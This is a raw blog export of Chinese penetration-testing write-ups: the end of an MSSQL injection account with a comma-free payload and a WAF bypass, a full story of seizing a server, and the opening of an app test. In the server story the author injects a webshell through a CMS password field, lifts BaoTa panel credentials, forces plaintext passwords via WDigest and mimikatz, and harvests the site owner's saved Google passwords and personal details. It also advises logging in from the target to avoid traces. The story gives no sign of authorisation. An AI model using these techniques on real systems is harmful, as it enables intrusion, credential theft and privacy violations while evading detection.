<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122713847-7ba05470-d3d5-4c52-ac18-71c77d89af3d.png" alt="img"></p>
<p>测试到这里，我发现可能不是单纯的SQL语句拼接</p>
<p>仔细观察参数发现了猫腻，<code>dcid_6=39&amp;dcid_6=42&amp;dcid_6=386</code>这三个参数传到WEB服务器，由于<code>.Net</code>解析的特性就变成了<code>dcid_6=39,42,386</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122880717-2b54c864-9495-400f-aff0-2656d19d741a.png" alt="img"></p>
<p>加上这是个答案提交的表单，肯定是WEB应用先将参数用<code>逗号</code>分割成<code>列表</code>然后再遍历<code>列表</code>将语句拼接到SQL中，所以这也就导致了我测试的payload只要有<code>逗号</code>就报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123207380-09fc0f38-9ec8-4b82-bf33-c87973db112b.png" alt="img"></p>
<p>所以得构造一个没有逗号的payload，首选是<code>(case when user like &#39;a%&#39; then 1 else user end)</code></p>
<p>解析：如果<code>user like &#39;a%&#39;</code>返回<code>1</code>否则返回<code>user</code>，由于对应的字段类型是<code>整数型</code>，传入<code>字符型</code>的<code>user</code>会导致服务器报错，所以可以借此判断注入</p>
<p>但是目标环境还有WAF，用这条payload被拦截了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123520682-99d9f354-9c0c-4600-9ca0-11d61227e5cd.png" alt="img"></p>
<p>Bypass WAF首选是畸形包，因为可以直接绕过，比较方便</p>
<p>如下图我用<code>filename</code>字段伪造了一个假的文件上传，欺骗了WAF</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123615463-1bbe1df0-dca7-4d39-b143-1cd38a9cfeb4.png" alt="img"></p>
<p>然后就用intruder直接跑就行，跑出来第一个字符是<code>l</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123733020-42622ff2-e4d5-4367-a24a-d008cd3bf948.png" alt="img"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title>从getshell失败到旁站拿下服务器</title>
    <url>/posts/5f72f0c0.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/onOdQqrBCeiBhUpa3xkSSg">https://mp.weixin.qq.com/s/onOdQqrBCeiBhUpa3xkSSg</a> 酒仙桥六号部队</p>
<p>编者荐语：shell 解析不了可能是网站被打包成 jar的形式部署，思路转向子域名资产，还有点内网渗透过程。</p>
</blockquote>
<h2 id="简单的尝试"><a href="#简单的尝试" class="headerlink" title="简单的尝试"></a><strong>简单的尝试</strong></h2><p>用扫描器扫了一下，没有发现漏洞。发现网站存在CDN：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640.png" alt="图片"></p>
<p>看了下历史解析记录，还好不多。通过判断，确定最后一条为真实IP：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719628.png" alt="图片"></p>
<p>查看下IP绑定的网站，查到3个域名，其中一个无法访问，另一个是个后台：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719629.png" alt="图片"></p>
<p>我们先来看这个后台：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719630.png" alt="图片"></p>
<p>随便输入一个账号和密码，提示数据不存在：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719731.png" alt="图片"></p>
<p>扫了下目录，只扫出个upload目录。存在列目录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719732.png" alt="图片"></p>
<p>简单看了下，没有敏感信息，都是图片：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719733.png" alt="图片"></p>
<p>回到后台，先爆破一波。挂服务器爆破了不知道多久，成功爆破到管理员密码，登录后台：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719734.png" alt="图片"></p>
<p>通过后台可以看出这个数据应该是APP注册数据，有50多万条记录。用户名应该是随机取名的，后来拿下权限后验证猜测没错：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719735.png" alt="图片"></p>
<p>回到正题。尝试拿shell，发现可以上传任意文件，但是都不解析。直接下载，最后没能突破成功。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719736.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719737.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719838.png" alt="图片"></p>
<h2 id="简单的审计"><a href="#简单的审计" class="headerlink" title="简单的审计"></a><strong>简单的审计</strong></h2><p>就在一筹莫展的时候，上帝为我开了一扇窗。翻后台功能，发现系统配置处配置了几个域名。叫PC的这个域名引起了我的注意。</p>
<p>对这个PC站进行渗透，扫描无果，手工渗透无果。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719839.png" alt="图片"></p>
<p>通过查看源码，可以看出这套程序是用了某CMS程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719840.png" alt="图片"></p>
<p>根据CMS名字，很快找到了官网，并且下载了一份下来本地搭建，准备审计：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719841.png" alt="图片"></p>
<p>本地搭建好后，查看了下使用说明，发现网站后台存在默认账号和密码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719842.png" alt="图片"></p>
<p>使用默认账号和密码尝试登录目标站后台，成功登录。简单看了下后台，功能很简单，除了设置网站标题，基本上没什么有用的功能。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719843.png" alt="图片"></p>
<p>看官网介绍，经验令我立刻感觉到，在密码修改这里可能会有问题。密码直接明文保存在boss.php文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719844.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719945.png" alt="图片"></p>
<p>在本地测试发现，修改密码处内容是直接写到boss.php文件，并且没有过滤：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719946.png" alt="图片"></p>
<p>接下来我们尝试拿Shell。在账号处插入phpinfo()函数，文件内容变成了这样：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719947.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719948.png" alt="图片"></p>
<p>本地测试执行成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719949.png" alt="图片"></p>
<p>用如上方法，在目标站中成功写入Shell，开心！！！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719950.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836719951.png" alt="图片"></p>
<p>发现是System权限，但是执行系统命令的时候发现执行不了。再一次火大：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720052.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720053.png" alt="图片"></p>
<h2 id="巧用宝塔配置文件"><a href="#巧用宝塔配置文件" class="headerlink" title="巧用宝塔配置文件"></a><strong>巧用宝塔配置文件</strong></h2><p>PHP版本5.3.29看下disable_functions是怎么配置的。果然不出所料，禁用了不少函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720054.png" alt="图片"></p>
<p>由于是Windows系统，利用Windowcom组件绕过限制需要满足php5.4。</p>
<p>由于版本太低，谷歌了半天没找到方法，无奈只能放弃，翻翻看看有没有敏感文件之类的。</p>
<p>运气不错，发现网站居然是使用宝塔搭建的，之前居然没反应过来，而且宝塔目录权限还挺高，能看到配置文件内容：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720055.png" alt="图片"></p>
<p>Windows下宝塔配置文件在&#x2F;BtSoft&#x2F;panel&#x2F;data&#x2F;目录下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720056.png" alt="图片"></p>
<p>宝塔数据库是用的sqlite3，我们下载下来后直接用navicat打开即可：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720157.png" alt="图片"></p>
<p>获取到宝塔登录密码，成功解密md5：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720158.png" alt="图片"></p>
<p>成功登录到宝塔界面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720159.png" alt="图片"></p>
<p>通过计划任务添加管理员：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720160.png" alt="图片"></p>
<p>成功登录服务器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720261.png" alt="图片"></p>
<p>通过服务器找到刚刚那个网站的目录，才知道是因为网站被打包成jar，所以解析不了脚本：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720262.png" alt="图片"></p>
<h2 id="获取管理员密码"><a href="#获取管理员密码" class="headerlink" title="获取管理员密码"></a><strong>获取管理员密码</strong></h2><p>因为服务器是Windowsserver2012，所以需要修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</span><br></pre></td></tr></table></figure>



<p>其中的”UseLogonCredential”设置为1，类型为DWORD32，然后下次用户再登录的时候才能记录到明文密码。使用mimikatz成功获取管理员密码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720263.png" alt="图片"></p>
<p>在半夜的时候，成功利用管理员账号登录上服务器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720264.png" alt="图片"></p>
<h2 id="管理员信息收集"><a href="#管理员信息收集" class="headerlink" title="管理员信息收集"></a><strong>管理员信息收集</strong></h2><p>查看谷歌浏览器发现管理员记住了谷歌密码，直接登录谷歌，利用谷歌获取管理员真实姓名，电话，邮箱，qq，地址等敏感信息：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720265.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720266.png" alt="图片"></p>
<p>通过谷歌密码安全检查，获取到管理员所有保存在谷歌的账号密码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8Egetshell%E5%A4%B1%E8%B4%A5%E5%88%B0%E6%97%81%E7%AB%99%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/640-166000836720267.png" alt="图片"></p>
<p>建站人的信息收集得差不多了，渗透到此也就结束了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透要细心，入口点不止一个，多尝试。比如遇到Shell解析不了，可以尝试其他方法。</p>
<p>多翻翻敏感目录，配置文件，说不定管理员就在配置文件里面。</p>
<p>在获取目标账号后，不要在自己本地登录，以免留下登录日志和IP，尽量在目标服务器登录。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
      </tags>
  </entry>
  <entry>
    <title>从一个App到getshell的一次经历</title>
    <url>/posts/bbe15731.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/QJW13hj08R57-AM0ZpRz1g">https://mp.weixin.qq.com/s/QJW13hj08R57-AM0ZpRz1g</a>  酒仙桥六号部队</p>
<p>编者荐语：从开局一个apk包，到渗透第三方服务支持获取源码，经过代码审计，最终getshell。</p>
</blockquote>
<p>在一次授权渗透测试中，得知测试目标是拿到权限或者关键用户数据。客户一开始只提供了一个安卓apk，在这种情况下，我们要怎么顺利完成测试呢？</p>
<h2 id="App测试"><a href="#App测试" class="headerlink" title="App测试"></a><strong>App测试</strong></h2><p>一开始只提供了安卓apk包，也就只能从这个App入手。安装完成，打开之后就是一个登录页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640.png" alt="图片"></p>
<p>配置好，收集代理，准备进行测试。过程中发现抓包无法抓到，报错信息如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036701.png" alt="图片"></p>
<p>由于App测试经验不多，一开始没理解。搜索一番之后发现，原因是由于安卓7.0开始只信任系统级别的证书，不再信任用户导入的证书。</p>
